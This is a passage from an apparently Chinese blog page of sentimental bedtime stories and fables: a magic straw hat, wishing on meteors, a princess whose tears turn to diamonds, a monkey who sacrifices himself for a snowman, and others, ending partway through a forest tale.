<p>获得了自由的它，使劲飞啊飞，它想飞遍所有的山川河流，飞遍所有的国度。</p>
<h5 id="2"><a href="#2" class="headerlink" title="$2"></a>$2</h5><p>它越飞越高，越飞越远。</p>
<p>飞过森林，它忽然看到三个男孩在欺负一个哭泣的小男孩。</p>
<p>它急忙的飞下去，刚好落在小男孩的小脑袋上。</p>
<p>小男孩渐渐的停止了哭泣，用小手抹了抹脸上的泪痕，昂首挺胸的站在三个男孩的面前，握紧拳头毫不畏惧的盯着他们。</p>
<p>欺软怕硬的男孩们顿时感到眼前的小男孩像是变了一个人，不再是任人欺负的懦弱样子。他们对视了一眼，怏怏的走了。</p>
<p>这时小男孩才发现头上多了一顶草帽，他跑到小河边照了照，头上的草帽真漂亮啊，而且还扎着红绳子。他高高兴兴的往家的方向走去</p>
<p>当他快走到家门口的时候，一阵风吹过，草帽带着剩下的一半魔力，乘着风又飞走了。</p>
<h5 id="3"><a href="#3" class="headerlink" title="$3"></a>$3</h5><p>不知不觉，天暗下来，空气变得很寒冷很潮湿，看样子暴风雨要来了。</p>
<p>草帽只好飞进一个大房子里避雨。</p>
<p>屋子里，一个醉汹汹的酒鬼正在大声咒骂着殴打自己的妻子，地板上到处是摔碎了的瓶瓶罐罐，他的妻子身上布满了伤痕，徒劳的躲避着酒鬼的殴打。</p>
<p>草帽愤怒的飞舞起来，以迅雷不及掩耳之势扣在了酒鬼乱糟糟的头上。</p>
<p>酒鬼一下子就晕过去了。</p>
<p>第二天早上醒来，酒鬼像是换了一个人，很亲切的向妻子问候，跟邻居打招呼。他把家里的酒都扔掉，然后搬来梯子，想要把漏雨的屋顶修补一下。</p>
<p>又是一阵大风，草帽心满意足的带着残留的一点点魔力飞到了高空中。</p>
<h5 id="4"><a href="#4" class="headerlink" title="$4"></a>$4</h5><p>这时的它，已经没有足够的魔力周游世界了。</p>
<p>只飞了一会儿，它就再也飞不动了。<br>它向地面望去，发现了麦田里有一个稻草人。</p>
<p>它决定落上去休息一下。<br>它缓缓的落在了稻草人的脑袋上。<br>精疲力尽的草帽，不敢去幻想周游世界。于是它很难过。</p>
<p>它在稻草人的脑袋上，停留了一个月。</p>
<p>热心的稻草人给草帽讲了许许多多的故事：</p>
<p>关于很多年前它有一身好看的衣服；<br>关于偷吃麦子的麻雀；<br>关于农夫的顽皮儿子们；<br>关于只有夜间才出来的灰色小刺猬；<br>关于路边绽放的那些不知名的小野花；<br>……</p>
<p>有一天，草帽告诉稻草人，我是有魔力的草帽，你有什么心愿吗？我可以帮你实现！</p>
<p>稻草人激动的说，真的吗!? 那你能不能把我变成人类呢？我常常幻想自己变成真正的人类，可以跑步，可以去外面的世界看一看！</p>
<p>草帽沉默了。</p>
<p>第二天早上，当太阳的第一缕阳光照在稻草人的身上的时候，奇迹发生了。</p>
<p>稻草人身上的毛茸茸的稻草渐渐的变成了皮肤，皮肤外面又多出了几件衣裤，脸上也有了丰富的表情。<br>他惊讶的摸索自己的脸和身体，不敢想象自己真的成为了一个有血有肉的人类。</p>
<p>他欢呼着喊着草帽的名字，想要感谢它的帮助！</p>
<p>可是草帽，就静静的戴在他的脑袋上，没有任何动静。</p>
<p>就像店铺里卖的那种普普通通的草帽。</p>
<p>一阵风吹过。</p>
<p>草帽从稻草人的脑袋上滑落，笔直的掉在了地上。</p>
<p>安静的落在尘土里。</p>
<p>没有飞行，也没有说话，没有生气。</p>
<p>就像大街上最常见的那种草帽。</p>
<p>稻草人呆呆的，忘记了语言。</p>
<p>他流下了他成为人类后的第一滴眼泪。</p>
<p>这时，一个流浪汉路过他身边，恰好看到了地上的草帽。</p>
<p>那顶被他亲手系上红绳子的草帽。</p>
<p>他很高兴的捡起了草帽，小心翼翼的拍掉上面的尘土，自言自语道，小家伙，你怎么在这里啊？走吧，我们去周游世界！</p>
<p>流浪汉戴上这顶草帽，大步的向前走去。</p>
<p>不一会，就消失在了地平线。</p>
<blockquote>
<p><strong>愿我有歌可长留此间，</strong><br><strong>赞美这上天的恩宠，</strong><br><strong>使我在人间能够相信奇迹，</strong><br><strong>暮色里仍会有五彩的长虹。</strong></p>
<p>——几米《幸运儿》</p>
</blockquote>
<p>决定我们是否能够到达远方的，不是因为我们有什么样的能力，而是因为我们有一颗怎样的心。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：等不到的流星"><a href="#晚安小故事之：等不到的流星" class="headerlink" title="晚安小故事之：等不到的流星"></a>晚安小故事之：等不到的流星</h3></blockquote>
<p>“相传，当你看到一颗流星的时候能够及时的许愿，并且在流星消失之前完成许愿，那么那颗流星就会替你实现那个愿望”</p>
<p>为什么说是相传呢 ？</p>
<p>因为这个办法的成功率实在是太低了————首先，那个流星的大小要合适，太小的流星没有足够的魔力；其次，你要有足够清晰的口齿，要让流星明白你想要什么；再次，许愿的速度要足够快，因为一颗流星的平均寿命是一到一点五秒。。。。。。</p>
<p>“所以自古以来，没几个人成功，许愿只是成为了一种浪漫的仪式。”小披风最后总结道。</p>
<p>问题是，小蝴蝶并不这样想。</p>
<p>她听小披风讲完这个传说之后，两眼放光，也顾不上理会小披风无比懊悔的表情，开始着手制定“小蝴蝶殿下终极完美许愿大作战”。</p>
<p>听起来很霸气，小披风童鞋也开始期待了。但是这种期待在第二天早上就完全破灭了———小蝴蝶用暴力恐吓的手段逼着他陪自己练习“吃葡萄不吐葡萄皮”</p>
<p>好吧，这就是所谓的魔鬼训练。从“吃葡萄不吐葡萄皮”，到“八百标兵奔北坡”，然后是“灰化肥发黑，黑化肥发灰”。</p>
<p>当然，小蝴蝶殿下的神经质不是一天两天了，小披风早已习以为常。<br>一周后的某个傍晚，当小披风一边睡觉一边说梦话“黑化肥挥发发灰会花飞；灰化肥挥发发黑会飞花。”<br>小蝴蝶把他摇醒拉到后山，然后兴冲冲的拿出一张清单，哦不，是一条清单，清单上密密麻麻的写着好几十个愿望。</p>
<p>小披风大概扫了几眼：</p>
<p>“我要变苗条，瘦腰瘦小腿”</p>
<p>“我要长高十公分”</p>
<p>。。。额。。这没什么好许愿的。。。</p>
<p>“我要当公主”</p>
<p>“我要白马王子”</p>
<p>“我要钻石”</p>
<p>。。。这。。。伤不起的流星啊。。。 看着看着，一不留神，他的下巴脱臼了。</p>
<p>他无奈的一摊手，咳咳咳…那个…你觉得……一颗流星能给你实现这么多愿望吗？</p>
<p>她十分肯定地说，一颗流星的话，当然不能！但是，流星雨可以啊！</p>
<p>流……星……雨，小披风两眼一黑，差点晕过去。。。</p>
<p>他们俩每天晚上坐在后山看星星，这一等就是三个月。</p>
<p>漫天璀璨的繁星，像是一块深蓝色的画布上，点缀着数不清的钻石，宁静的月光洒在脸上，心也变得很安静，周围环绕着不知名的虫鸣。小披风忽然发现，身边的小蝴蝶忽闪着的大眼睛比星星还漂亮，干净，清澈，因期待而带着些许的光芒。</p>
<p>日子一天天过去，等流星已经成为了他们的每天的必修课。</p>
<p>又过了几年，他们两个人不再拥有大把的时间来做自己的事，但是一有空闲，依然会跑到山上去看星星，一看就是一个晚上。</p>
<p>然后，在天亮的时候，他背着不知道什么时候睡着的她下山。她睡着的时候常常笑的很甜，小披风摇摇头，这孩子估计又梦见流星雨了。</p>
<p>他们后来搬到了另一个城市，有了孩子，孩子从小就听那个关于流星的故事，所幸的事，小蝴蝶殿下对流星的那份执念，没有遗传给孩子。</p>
<p>时光飞逝，几十年一转眼就过去了。</p>
<p>当年的小蝴蝶已经成了可爱的小老太太，她还是会时不时的唠叨着流星的事。偶尔她会质问身边那个老头子，当年那个传说是不是骗她的？</p>
<p>老头矢口否认。</p>
<p>其实当年的故事真的是他编出来哄她开心的。</p>
<p>但是他知道，流星真的可以实现愿望。</p>
<p>因为当年的某一个夜晚，小蝴蝶的脑袋靠在他肩膀上睡觉的时候，他不经意间瞥到了天际划过一颗流星，好大的一颗流星，他从来没有想到过流星可以这么明亮。</p>
<p>他下意识的许下了一个愿望。</p>
<p>那个愿望，真的实现了。</p>
<p>于是，小蝴蝶陪着他，看了一辈子的星星。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：最珍贵的眼泪"><a href="#晚安小故事之：最珍贵的眼泪" class="headerlink" title="晚安小故事之：最珍贵的眼泪"></a>晚安小故事之：最珍贵的眼泪</h3></blockquote>
<p>在很久很久以前，有一个国王。</p>
<p>他把他的国家治理的非常好，国家不大，但百姓们丰衣足食，安居乐业，十分幸福。</p>
<p>国王有三位美丽可爱的小公主，三位小公主们从生下来就具有一种神奇的魔力，当她们哭泣的时候，落下的眼泪会化作一颗颗晶莹剔透的钻石，价值连城。</p>
<p>有一天，国王发觉自己年事已高，自己的国家还没有人可以托付，公主们也没人照顾。于是昭告天下：</p>
<p>“众所周知，我有三位的公主，她们每个人都拥有举世无双的美貌，而且她们的眼泪可以化作昂贵的钻石，一个月后，我将为她们召集所有的优秀的男人，让她们挑选自己心仪的丈夫————被选中的人将有机会继承我的国家和财富！”</p>
<p>一个月后，国王的城堡里挤满了来自世界各地的王子，骑士和富豪之子。一个个都是英俊潇洒，器宇不凡。</p>
<p>他们自信满满的围在王宫里，等待着公主们的到来。</p>
<p>正午的时候，国王带着他的三位公主们来到宫殿。为了表示对远道而来的客人的欢迎，大公主在现场为众人唱了一首歌，嗓音清澈，犹如天籁；二公主在现场为众人跳了一支舞，步伐轻盈，身段美妙。而最年幼的小公主，对着众人浅浅的一笑，就躲在国王的身后再也不肯出来。</p>
<p>国王尴尬的解释道，请大家不要介意，小公主自从生下来后就没有说过话，而且很怕生人。</p>
<p>为了博取公主们的亲睐，大家纷纷展示了自己的长处，有的当场写诗作画送给大公主，有的为二公主表演剑法和马术，有的拿出世间少有的奇珍异宝献给小公主。</p>
<p>大公主和二公主都很开心，也渐渐有了自己的决定，只有小公主静静的依然躲在国王的身后。</p>
<p>大公主最后选择了一个王子，那个英俊的王子对她许诺说，会为她征服全世界，在每座城堡上刻下她的名字；</p>
<p>二公主最后选择了富豪之子，那个聪明的男孩对她保证说，他会赚很多钱，为她建立一座世界上最华丽的宫殿，里面摆满美丽的奇珍异宝；</p>
<p>小公主平静的看着那些人，摇了摇头。</p>
<p>正在国王准备宣布结果时，从人群中走出一个年轻的牧羊人，他径直走到小公主跟前，在她耳边说了一句话。</p>
<p>小公主忽然笑的很灿烂，她毫不犹豫的挽住了牧羊人的手。</p>
<p>这样，三个公主都有了自己的伴侣。</p>
<p>五年过去了。。。</p>
<p>大公主的丈夫用眼泪变成的钻石招兵买马，四处征战，百战百胜，每一座被他征服的城堡上，真的全都刻上了大公主的名字。大公主的名字，变得家喻户晓。她觉得自己很幸福。</p>
<p>二公主的丈夫用眼泪变成的钻石作为成本，生意越做越大，当然，生意做得很大之后，也就不需要钻石了。他不愧是商人之子，简直是天生的商人，很快，就积累了海量的财富，虽然还没有建造出世界上最最豪华的宫殿，但是二公主也已经很心满意足了。她觉得自己很幸福。</p>
<p>小公主自从那天跟着牧羊人离开国王的城堡，就开始周游世界。后来他们找到一个山清水秀的世外桃源，就定居了下来。</p>
<p>牧羊人花了半个月的时间，用木头和稻草搭建了一个大房子，又做了很多家具。他们在房子的后面种了很多蔬菜，在菜地的周围，亲手做了一排栅栏。小公主把她见到的好看的花，都移植到了自己的小花园里，虽然不知道这些小野花叫什么名字，可每天看到它们就会很开心。傍晚的时候，他们会坐在湖边钓鱼，或者数星星。</p>
<p>他们一直很穷，但是他们生活的非常开心。小公主渐渐地开始开口说话，她只对牧羊人一个人说，什么都说，天上的云彩啊，河里的鱼啊，树上的鸟窝啊，头上的蝴蝶啊一天到晚叽叽喳喳说个不停。牧羊人常常坐在湖边，安静的听她讲故事，一直到小公主讲着讲着，累得睡着了，把她抱回房间。</p>
<p>国王病危，他派人找回了三个公主和她们的丈夫。</p>
<p>他很惊讶的发现，小公主夫妇穿着干净整齐却打满补丁的衣服，他好奇他们为什么这么贫穷。要知道，小公主随便一滴眼泪就足够买一家衣服店。</p>
<p>牧羊人说，因为我从来不让她哭泣。</p>
<p>国王立刻决定，把王位传给牧羊人。</p>
<p>也许每个人对于幸福都有自己的理解，答案从来都不是唯一的。但是只有牧羊人懂得什么是珍惜。</p>
<p>国王问小公主，当年牧羊人跟你说了什么话？</p>
<p>小公主说：</p>
<p>“他在我耳边说，即使你的眼泪可以化作最昂贵的钻石，我宁愿贫困潦倒一生，也不许你哭。”</p>
<p>最珍贵的眼泪，不是能化作钻石的眼泪，而是不会落下的眼泪，因为珍惜你的人，不会让你哭。</p>
<p>我没法承诺能给你太多的东西，因为未来不确定，因为我们不确定。</p>
<p>但我会告诉你，我不许你哭。</p>
<p>&lt;晚安&gt;</p>
<blockquote>
<p>后记：</p>
<p>其实这篇故事源自我年幼时的记忆：</p>
<p>很久很久以前，一个小女孩在老气横秋的叹气，快来一个王子把我带走吧。</p>
<p>小男孩问，一定要王子吗，骑士可以吗？</p>
<p>小女孩说，可以！</p>
<p>小男孩又说，牧羊人可以吗？</p>
<p>小女孩歪脑袋想了想说，可以！</p>
<p>我不想当你的王子，我想当你的牧羊人。</p>
<p>我花了一些篇幅来描述他们的生活，一种世外桃源的神仙眷侣。可以靠自己的那能力来生活，并没有因为不拿钻石换钱就食不果腹衣不蔽体。睡觉不过一张床，吃饭不过几斗米。生活中有更多的事情可以追求。小公主得到了他们想要的生活。</p>
<p>其实这就是童话和小说的区别。我本可以再写这样一个场景：【他们5岁的儿子有一天溜进父母的房间里找糖吃，看到一个罐子里，放满了眼泪状的钻石。他抓了一把跑去问父母这是什么？</p>
<p>昔日的小公主微笑着说，这是钻石呀。</p>
<p>昔日的牧羊人却很认真的告诉儿子，这可比钻石珍贵得多！它是你妈妈的眼泪。】</p>
<p>————然而，我如果这么写就不再是童话，而是小说了。我们生活在一个物质的时代，一个房奴车奴卡奴的时代。</p>
<p>不管多么浮躁，在大多数人的内心中，我们依然渴望那种安宁。</p>
</blockquote>
<p>====我是会讲故事的分割线O(∩_∩)O=====</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：你不要融化，我会陪你看一百万次"><a href="#晚安小故事之：你不要融化，我会陪你看一百万次" class="headerlink" title="晚安小故事之：你不要融化，我会陪你看一百万次"></a>晚安小故事之：你不要融化，我会陪你看一百万次</h3></blockquote>
<p>从前，有一片美丽的森林。</p>
<p>森林里生活着一只快乐的小猴子。</p>
<p>它每天的生活就是在树木之间跳跃，和伙伴们嬉戏打闹。<br>森林的尽头是一座大山，山顶常年被冰雪覆盖。</p>
<p>没有人爬上过那座雪山的山顶，而且大家也相信，爬上去的人，再也回不来。</p>
<p>据说山顶上有很多动物形状的雪人，那些都是曾经试图爬上山顶的动物，他们被永远地留在了山顶。<br>冬季来临了，空气变得很冷，直到有一天，天空中飘下雪花，雪花越来越大，越来越多，森林里的绿色渐渐地被纯粹的白色所取代。</p>
<p>没过多久，冰雪覆盖了整个森林。<br>在大雪覆盖森林的日子里，小猴子耐不住窝在家里的无聊时光，常常一个人跑出来玩耍。</p>
<p>冰雪的世界，很安静，安静的易碎。</p>
<p>所有的树木都睡着了。<br>他从一棵树轻巧的跳到另一棵树上，树干上的雪块被震落，纷纷扬扬的洒下来。他的呼吸声和心跳声，仿佛都有了回音。</p>
<p>这片森林忽然成为了他一个人的国度。<br>直到他遇到了那个雪人。<br>那个雪人围着红色的围巾，静静的站在一个松树下。</p>
<p>黑色的大眼睛里，带着一点点伤感，它仰望着天空，不知道在想什么。<br>小猴子高兴极了，他悄悄的爬到那棵松树上，从天而降到雪人面前，想吓它一跳。可是雪人只是平静的看了看他，说，你好。</p>
<p>嗯，你好。小猴子尴尬的笑了笑。</p>
<p>雪人说，你笑起来真好看，我就不会笑，雪人只可以有一种表情。我不知道我从哪里来，也不知道自己要做什么，只是每天看看日出，就觉得很开心。</p>
<p>小猴子拍着胸脯说，那我以后陪你看日出吧。</p>
<p>——真的吗？看几次？</p>
<p>——几次？当然是好多次！……看一百万次！</p>
<p>雪人平静的听着小猴子的豪言壮语。没有回答。</p>
<p>这是承诺吗。有时候，一句简单的话，会被说出的人和听到的人念念不忘，在我们不知道为什么而活着的时候，那几句特别的话，就会成为了我们生活的意义。</p>
<p>每天清晨，小猴子都会准时出现在雪人的身边，陪它看日出。太阳的第一缕光线照射在雪人圆圆的脸上，映出红灿灿的光辉，仿佛带着一种很特别的温度。小猴子心想，如果雪人会笑，一定会很美。</p>
<p>可惜雪人总也学不会笑。只有小猴子为了教它，整天对着它保持着笑脸，差点笑到抽经。</p>
<p>这是一个特别的冬季。小猴子整个冬天都没有感觉到寒冷，他过得很充实。整整一个冬天，他和雪人一起看日出，数云朵，在雪地上画画，小猴子还一度想教会雪人爬树————这种努力当然是徒劳的，因为对雪人来说，这比笑还难。。。。。。</p>
<p>日子过得很快，春天终于回来了。</p>
<p>在他们看第55个日出的时候，雪人的脸上布满了水珠，把小猴子吓了一跳。</p>
<p>小猴子问，雪人，你怎么哭了？</p>
<p>雪人说，我不是哭，春天来了，我要融化了。</p>
<p>小猴子慌了，他大声喊道，你不要融化！你不要融化啊！我们说好了要看一百万次日出的！</p>
<p>雪人全身都在流汗，脸上布满了水痕，平静的说，我只能活在冬天里，冬天过去，我就会消失。即使是你，也只能活几十年，怎么可能看一百万次日出呢。笨蛋。谢谢你陪我看的这55个日出，我会永远记住的，也请你不要忘了我。</p>
<p>小猴子拼命摇头，不会的。我说过的要带你看一百万次日出，就一定会做到！我不会让你消失的。你都没有对我笑过。</p>
<p>这时小猴子忽然转头，望向森林尽头的雪山，心里下了一个决定。</p>
<p>他抱起雪人，飞一般的冲向雪山脚下。</p>
<p>等到他们来到了山脚下，已经奄奄一息的雪人才反应过来小猴子的意图。</p>
<p>它虚弱的说，你不要上去，上面的暴风雪会冻死你的。</p>
<p>小猴子说，我要给你一个永不消失的冬天。</p>
<p>小猴子紧紧抱着雪人，开始向山顶攀登。</p>
<p>随着海拔的增加，暴风雪的威力也增加了，小猴子咬紧牙关拼命攀爬。他看了看怀里的雪人，雪人已经停止了融化，但依然没有醒过来。</p>
<p>不知道过了多久，他们奇迹般的来到了雪山的山顶。</p>
<p>已经快要冻僵的小猴子，松开了发抖的双手，把雪人放在面向东方的巨石上，然后如释重负的坐在了它的旁边。他已经感觉不到任何寒冷了。</p>
<p>他知道，自己马上就要冻死了。</p>
<p>身旁的雪人在暴风雪的滋补下，身形开始重新塑造。相信过不了多久，就可以重新睁开眼睛。</p>
<p>在小猴子结冰之前，他用尽全身的力气挤出最后一个微笑。这个微笑被时间凝固起来，永远的封存。</p>
<p>雪人醒来的时候，她看到身边已经冻僵了的小猴子，正在对着她微笑，仿佛像往常一样，在教她怎么微笑。</p>
<p>雪人笑了。</p>
<p>地上刻着一行字：</p>
<blockquote>
<p>你不要融化，不要离开我，我们说好了要看一百万次日出，少一次都不行。</p>
</blockquote>
<p>从前有一座山。</p>
<p>山顶上有一块巨石。</p>
<p>一只雪人和一只猴子，他们在雪山的巨石上相互依靠着，坐了三千年。</p>
<p>如果我要离开，那就把时间凝固在我微笑的时候。这样你会看到，我在对着你笑，永远对着你笑，总有一天，你会学会对我微笑。</p>
<p>你对我说，你注定属于寒冷。那就让我去你的世界，这样，我们是不是可以抱的更近一点？</p>
<p>再近一点好不好，一点就行。我不贪心。</p>
<p>就算你的世界里全是暴风雪，我也会微笑着陪你。</p>
<p>我不离开。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之：月亮之子-我想温暖这个有你的世界。"><a href="#晚安小故事之：月亮之子-我想温暖这个有你的世界。" class="headerlink" title="晚安小故事之：月亮之子 / 我想温暖这个有你的世界。"></a>晚安小故事之：月亮之子 / 我想温暖这个有你的世界。</h3></blockquote>
<p>每天晚上，当月亮升起的时候，月亮之子就会降临地面。</p>
<p>他是一个普通的小子。</p>
<p>深夜里，他会独自一个人，无忧无虑的在月光下散步。</p>
<p>天亮前，他就会消失。</p>
<p>没有什么目的性，他与这个世界没有什么联系。他只是以这样一种简单的姿态，在特定的时候，存在于这个世界。</p>
<p>在一个寒冷的夜晚，他像往常一样在皎洁的月光下散步。</p>
<p>这时，他在路边看到了一个昏倒的小女孩。</p>
<p>于是他把小女孩抱在怀里，带到一棵大树下，在周围点燃了一堆篝火。也许是篝火的温暖，也许是月亮之子的怀抱的温暖，不一会儿，小女孩就醒了过来。</p>
<p>小女孩惊讶的问，你是谁啊？ 月亮之子撒谎道，我只是一个路过的行人，看到你昏迷，就带你过来烤烤火。你好一些了吗？</p>
<p>小女孩本能的往月亮之子的怀里挤了挤，然后说，我没事，就是有一些累，睡一觉就好了。</p>
<p>月亮之子抱紧她说，那就睡吧。天亮了再赶路。</p>
<p>半夜的时候，小女孩又醒了一次，她指着那堆篝火说真好看，就像跳舞的小精灵，据说跳舞的小精灵的脚丫是火焰做的，只有内心最纯净的人才能看得到那舞蹈。</p>
<p>月亮之子给小女孩讲了好多小故事，小女孩很开心，她说恶魔其实是个乖孩子，因为它没有伤害过任何人。她又说见习死神一定是天使变的，原来天使有时候也会撒谎。</p>
<p>小女孩躺在月亮之子的怀里，抬头望着漫天繁星，开始数星星……没过多久，她再一次睡着了。</p>
<p>天快亮的时候，月亮之子把外衣披在了小女孩的身上，然后往篝火里加了一些木柴，准备离开。</p>
<p>可是他舍不得，也不放心。</p>
<p>他知道小女孩白天的时候会继续赶路，可是天气越来越冷。</p>
<p>他不知道自己还能做些什么。</p>
<p>他马上就要消失了。</p>
<p>天亮了，小女孩醒了过来。</p>
<p>她发现盖在自己身上的衣服，她知道这是那个路人留给她的，而路人自己已经启程了。<br>相遇和离别，有时候是一件很简单的事。没有什么特殊的理由。</p>
<p>因为每个人都有自己的目的地。</p>
<p>小女孩离开那堆篝火，回到自己的路上，忽然被眼前的景象震住了。<br>路的两旁，是整整齐齐的两排篝火，通红的篝火，如同两条火龙一直延伸向地平线。</p>
<p>我想温暖你，不管我在哪里。</p>
<p>如果有一天我会离开你，那就让我温暖这个有你的世界。因为我要你知道，即使你看不到我，也可以感受到我的温暖。</p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之-七秒钟的鱼-我们在一起的时间，是我给你的一生"><a href="#晚安小故事之-七秒钟的鱼-我们在一起的时间，是我给你的一生" class="headerlink" title="晚安小故事之:七秒钟的鱼/ 我们在一起的时间，是我给你的一生"></a>晚安小故事之:七秒钟的鱼/ 我们在一起的时间，是我给你的一生</h3></blockquote>
<p>我叫丁丁，是一只住在深海的热带鱼。</p>
<p>今天，我和妈妈走散了。她不会来找我的。即使我有着一身独特的花纹，她也不会来找我的————因为她根本不会记得我。我和她已经走散了好几分钟了，而我们鱼的记忆，却只有7秒，她会忘了我，就像从来没有过我这个儿子一样。而我，却和其他的鱼不一样，我记得我从生下来以后的所有事情。</p>
<p>可能是上帝在创造我的时候疏忽大意，竟让我拥有了一生的记忆。可这并不好，每只从我身边经过的伙伴们，蹭蹭我的身子后，又“嗖”的一声游走，他们不记得我，但我却记得他们，他们的快乐只延续7秒，痛苦也只延续7秒，而我的孤独却会远远超过7妙。</p>
<p>我游到以前和妈妈常常栖息的珊瑚礁旁，等她。可一天过去了她也没有出现，我失望的游走了。这时，我感到一阵暖流，一群鱼游过我的身边，他们要迁徙到我们这片海域。他们长得和我们不一样，灰白色的身子，没有花纹。</p>
<p>当他们快要游走时，一只落在队伍末尾的鱼撞上了海底的珊瑚礁，在原地晕了好几秒，掉队了。我游了过去，发现她身上的花纹比同类多了一道，紫色的，显然比其他鱼好看。</p>
<p>我游到她身边，对她说：“你快走吧！你掉队了！”</p>
<p>她说：“什么？什么队？我有点儿累了，想歇一会儿……”说完就睡了，我在旁边等着她醒来。</p>
<p>没过多久，她果然就醒了，转身就要游走。我急忙跟了过去。</p>
<p>“嘿！我叫丁丁。你叫什么？”我问道。</p>
<p>“我叫当当！我们去找吃的吧！”她说。</p>
<p>过了一会，她说：“嘿。你跟着我干嘛，你是谁？”</p>
<p>我说我是丁丁。</p>
<p>又过了一会，她说，你的花纹真好看，我叫莎莎，你叫什么？</p>
<p>我说，我叫丁丁。</p>
<p>就这样，我们每天都在一起。一起游，一起休息。她有时候会跟我说话，问我叫什么。有时会沉默，然后用陌生的眼神看着我，我知道，她始终都不会记得我的。她只会认识我七秒钟，也只会拥有我七秒钟，我每日的陪伴却只能在她的眼睛里停留七秒，七秒之后，什么都没有了，我依然对于她，什么都不是。</p>
<p>我看着她快乐，看着她难过，她的一点一滴我都记在心里。可我呢，永远都进不去她的心。我难过，我甚至不停的跟她说话，而七秒过后，她又会茫然的看着我，面带微笑，却永远不知道我在想什么。</p>
<p>所以，在一个明媚的清晨，阳光射进海底，我看着她的背影，转身游走了。</p>
<p>我走了，我要离开她。我知道她会和我的妈妈一样，不会记得我。不会来找我的。我走了。</p>
<p>远处的她，晃了晃身子，停在了原地。她感到一阵莫名的难受，她不知道是为什么。过了一会，她也游走了。</p>
<p>后来，她总会感到莫名的难受，虽然她只有七秒的记忆，但这种难受，绝对超过了七秒。</p>
<p><strong>丁丁也许永远不会知道。</strong><br><strong>虽然那只紫色条纹的她永远只记得他七秒钟。</strong><br><strong>虽然丁丁陪在她身边好几个月，却消失的不留痕迹。</strong><br><strong>但是对于她来说，七秒，便已是她的一生。</strong><br><strong>而丁丁，早已拥有了她的全部。</strong></p>
<p>&lt;晚安&gt;</p>
<p>##</p>
<blockquote>
<h3 id="晚安小故事之-微笑的小丑-我可以悲伤的坐在你身边"><a href="#晚安小故事之-微笑的小丑-我可以悲伤的坐在你身边" class="headerlink" title="晚安小故事之: 微笑的小丑/我可以悲伤的坐在你身边"></a>晚安小故事之: 微笑的小丑/我可以悲伤的坐在你身边</h3></blockquote>
<p>by小军</p>
<p>我不能悲伤的坐在你身边</p>
<p>在你身边我无法思考</p>
<p>我傻笑  然后傻笑</p>
<p>我的悲伤成了喜剧剧本里的无聊注脚</p>
<p>我可以悲伤的坐在你身边</p>
<p>我努力挤出一个微笑</p>
<p>我愿意一直一直戴着小丑的面具</p>
<p>悲伤不好</p>
<p>我不能悲伤的坐在你身边</p>
<p>生怕传染给你悲伤</p>
<p>哄你开心才是我存在的意义</p>
<p>因为我是小丑国的国王</p>
<p>我是小丑国的国王</p>
<p>我的臣民全是小丑的模样</p>
<p>他们出门时带着不同的笑脸</p>
<p>笑里藏枪</p>
<p>我只是想哄你开心的小丑</p>
<p>你干嘛把刀插进我怀里</p>
<p>我偏偏又是一个健忘的小丑</p>
<p>你一笑  我就痊愈</p>
<p>我想我可以悲伤地坐在你身边</p>
<p>我做不出别的答案</p>
<p>我在面具上涂满笑脸</p>
<p>我不知道是不是这样你就会喜欢</p>
<p>我是永远微笑的小丑</p>
<p>我可以悲伤地坐在你身边。</p>
<p><strong>有的人是情圣，一边爱，一边遗忘</strong></p>
<p><strong>有的人是小丑，一边笑，一边悲伤</strong></p>
<p><strong>【最简单的时光，是我心疼你，却不贪图你的时候。因为一旦爱了，就自私了。】</strong></p>
<p>&lt;晚安&gt;</p>
<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><blockquote>
<h3 id="晚安小故事之：你的梦想在远方，我的梦想在天上"><a href="#晚安小故事之：你的梦想在远方，我的梦想在天上" class="headerlink" title="晚安小故事之：你的梦想在远方，我的梦想在天上"></a>晚安小故事之：你的梦想在远方，我的梦想在天上</h3></blockquote>
<p>在地图上没有显示的土地上，生长着这样一片茂密的大森林。</p>
<p>森林里的树都非常高大，树干粗壮而笔直的向上，直插天际。树冠就像一只大伞，笼罩着树下的地面。</p>
<p>相传，这些树都是不死不老的，它们不受时间的束缚，永远向上生长，挑衅着天空。</p>
<p>有一天，一个背着旅行包的女孩在暴风雨里迷了路，慌忙中闯入了这片森林。茂密的树冠轻而易举的隔绝了肆虐着的暴风雨，森林里一片宁静，仿佛是另一个世界。女孩全身都湿透了，狼狈的坐在一棵大树下，整理着自己的衣物。</p>
<p>这时，不知从什么地方走出一个绿头发的男孩。</p>
<p>男孩友好的问，你是谁？从哪里来？</p>
<p>女孩说，我是一个旅行者，刚才在暴风雨里迷了路，闯进了这片森林。阿嚏！</p>
<p>男孩很担忧的问道，你没事吧？是不是病了？</p>
<p>女孩疲倦的摇摇头，谢谢你，我没事。我只是很累，睡一觉就好了。</p>
<p>说完，女孩坐靠在树干上，很快陷入了梦乡。男孩于是坐在她旁边，静静的守着她。</p>
<p>为什么她没有一点戒备，就这样在他面前睡觉？</p>
<p><strong>我们对这个世界充满了戒备，警惕，伤害也许来自任何一个方向，任何一种方式。然而，有一种安全感，在第一眼就可以识别。那种安全感可以来自于一个陌生人。它会让你知道，你可以在他面前放下一切的荆棘和盔甲。因为这世上，存在一种没有任何理由的信任，单纯而纯粹的信任。</strong></p>
<p>沉睡中的女孩，发梢上还带着水滴，睫毛微微抖动，鼻翼轻微的张合。男孩一直看着女孩，心里很安静，比看云朵，看星星时还安静。他甚至有那么一瞬间，希望她永远不要醒过来，就这样一直睡下去。</p>
<p>不知道过了多久，女孩面色开始发白，嘴唇也渐渐失去了血色。身体在不停的发抖。</p>
<p>男孩心想，糟了。她发烧了！</p>
<p>他急忙冲进森林深处，去寻找各种草药和果子。然后把草药熬成汤，小心翼翼的给女孩服下。女孩喝下了草药熬的汤，面色渐渐恢复了正常。</p>
<p>旁边一个苍老的声音说，她没事了。不过她的身子太弱了。短期内如果再经历一次暴风雨，很可能会死！</p>
<p>男孩看着睡熟的她，坚定的说道，不会的。我会保护她，不再让她受到任何伤害！</p>
<p>第二天，太阳出来了，森林里散发着清新潮湿的味道。</p>
